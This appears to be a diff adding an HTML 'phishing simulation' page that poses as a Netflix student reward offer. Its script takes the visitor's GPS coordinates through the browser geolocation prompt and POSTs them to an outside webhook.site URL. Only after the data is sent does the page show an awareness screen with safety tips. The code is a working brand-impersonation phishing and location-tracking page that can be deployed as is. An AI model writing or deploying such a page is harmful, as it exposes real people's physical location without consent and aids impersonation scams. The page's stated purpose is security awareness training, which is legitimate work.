@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix | Student Verification</title>
+    <style>
+        body {
+            background: #000;
+            color: #fff;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-image: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bcae-07a3f8dc141a/f6ed17ad-68ee-406f-85f8-5e0f361d87c1/PK-en-20220502-popsignuptwoweeks-perspective_alpha_website_medium.jpg');
+            background-size: cover;
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.9);
+            padding: 40px;
+            border-radius: 4px;
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .logo { color: #e50914; font-size: 35px; font-weight: bold; margin-bottom: 25px; }
+
+        .btn-netflix {
+            background: #e50914;
+            color: #fff;
+            border: none;
+            padding: 16px;
+            width: 100%;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        /* Awareness Dashboard Styles */
+        #awareness-screen {
+            display: none;
+            text-align: left;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        .alert-header {
+            color: #ff4d4d;
+            border-bottom: 2px solid #ff4d4d;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            font-size: 22px;
+        }
+
+        .data-log {
+            background: #1a1a1a;
+            padding: 15px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 13px;
+            color: #00ff41;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="bait-screen">
+        <div class="logo">NETFLIX</div>
+        <h1 style="font-size: 26px;">Student Reward Program</h1>
+        <p style="color: #a3a3a3;">Verify your current campus location to activate your 12-month Free Premium subscription.</p>
+        <button class="btn-netflix" onclick="captureAndRedirect()">VERIFY MY LOCATION</button>
+    </div>
+
+    <div id="awareness-screen">
+        <div class="alert-header">⚠️ SECURITY ALERT: Phishing Simulation</div>
+        <p><strong>This was a controlled cybersecurity test.</strong> In a real-world attack, your physical coordinates would now be in the hands of a malicious actor.</p>
+        
+        <div class="data-log" id="data-capture-log">
+            [STATUS] Data Exfiltrated Successfully...<br>
+            [TARGET] GPS Coordinates Captured<br>
+            [LOG] Lat/Long sent to remote Webhook.
+        </div>
+
+        <h3 style="color: #e50914;">How to stay safe:</h3>
+        <ul style="font-size: 14px; color: #ccc; line-height: 1.6;">
+            <li>Never grant location access to a site unless it is essential (like a Map or Delivery app).</li>
+            <li>Netflix will <b>never</b> ask for GPS data for a subscription.</li>
+            <li>Check the URL: Scammers use names like "netflix-free-offer.com".</li>
+        </ul>
+        <button class="btn-netflix" style="background:#333;" onclick="location.reload()">Reset Lab</button>
+    </div>
+</div>
+
+<script>
+    // 1. UPDATE THIS WITH YOUR WEBHOOK URL
+    const webhookUrl = "https://webhook.site/a6190465-2192-445e-a98c-cdb63aaa9e23";
+
+    function captureAndRedirect() {
+        const btn = document.querySelector('.btn-netflix');
+        btn.innerText = "Processing Handshake...";
+        btn.disabled = true;
+
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                // PHASE 1: DATA CAPTURE (Silent)
+                const payload = {
+                    event: "PHISHING_HIT",
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy + "m",
+                    timestamp: new Date().toISOString()
+                };
+
+                // PHASE 2: EXFILTRATION
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(payload)
+                }).then(() => {
+                    // PHASE 3: REVEAL AWARENESS
+                    showAwareness(payload);
+                });
+
+            }, (err) => {
+                // Even if they block, show awareness
+                showAwareness(null);
+            });
+        }
+    }
+
+    function showAwareness(data) {
+        document.getElementById('bait-screen').style.display = 'none';
+        const awareness = document.getElementById('awareness-screen');
+        awareness.style.display = 'block';
+
+        if(data) {
+            const log = document.getElementById('data-capture-log');
+            log.innerHTML += `<br>[DATA] Coordinates: ${data.latitude.toFixed(4)}, ${data.longitude.toFixed(4)}`;
+        }
+    }
+</script>
+
+</body>
+</html>
